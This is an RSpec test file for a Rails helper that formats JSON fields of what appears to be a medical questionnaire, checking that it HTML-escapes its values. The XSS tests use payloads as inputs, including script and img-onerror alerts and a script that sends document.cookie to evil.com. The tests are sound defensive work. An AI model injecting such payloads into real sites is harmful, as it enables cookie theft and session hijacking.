require 'rails_helper'

RSpec.describe QuestionnairesHelper, type: :helper do
  describe '#format_json_field' do
    context 'XSS対策' do
      it 'JSON配列内のscriptタグをエスケープする' do
        input = ['<script>alert("XSS")</script>', '正常な値'].to_json
        result = helper.format_json_field(input)

        expect(result).to include('&lt;script&gt;')
        expect(result).to include('&gt;alert(&quot;XSS&quot;)&lt;/script&gt;')
        expect(result).not_to include('<script>')
      end

      it 'HTML imgタグをエスケープする' do
        input = ['<img src=x onerror="alert(1)">', '正常な値'].to_json
        result = helper.format_json_field(input)

        expect(result).to include('&lt;img')
        expect(result).not_to include('<img')
      end

      it '翻訳された値もエスケープされる' do
        input = ['hypertension', '<script>alert("XSS")</script>'].to_json
        result = helper.format_json_field(input)

        # 翻訳された値（高血圧）は正常に表示
        expect(result).to include('高血圧')
        # スクリプトタグはエスケープ
        expect(result).to include('&lt;script&gt;')
        expect(result).not_to include('<script>')
      end

      it '複数の悪意ある入力を全てエスケープする' do
        input = [
          '<script>fetch("https://evil.com?cookie="+document.cookie)</script>',
          '<img src=x onerror="alert(document.domain)">',
          '<iframe src="javascript:alert(1)"></iframe>',
        ].to_json
        result = helper.format_json_field(input)

        expect(result).not_to include('<script>')
        expect(result).not_to include('<img')
        expect(result).not_to include('<iframe')
        expect(result).to include('&lt;script&gt;')
        expect(result).to include('&lt;img')
        expect(result).to include('&lt;iframe')
      end
    end

    context '正常なデータ' do
      it '空のフィールドは空文字を返す' do
        expect(helper.format_json_field(nil)).to eq('')
        expect(helper.format_json_field('')).to eq('')
      end

      it 'JSON配列を改行区切りの文字列に変換する' do
        input = ['高血圧', '糖尿病', 'その他: 喘息'].to_json
        result = helper.format_json_field(input)

        expect(result).to include('高血圧')
        expect(result).to include('糖尿病')
        expect(result).to include('その他: 喘息')
      end

      it '既に配列の場合も正しく処理する' do
        input = %w[高血圧 糖尿病]
        result = helper.format_json_field(input)

        expect(result).to include('高血圧')
        expect(result).to include('糖尿病')
      end

      it 'JSONパースに失敗した場合はエスケープして返す' do
        input = 'invalid json {'
        result = helper.format_json_field(input)

        expect(result).to eq('invalid json {')
      end
    end
  end
end
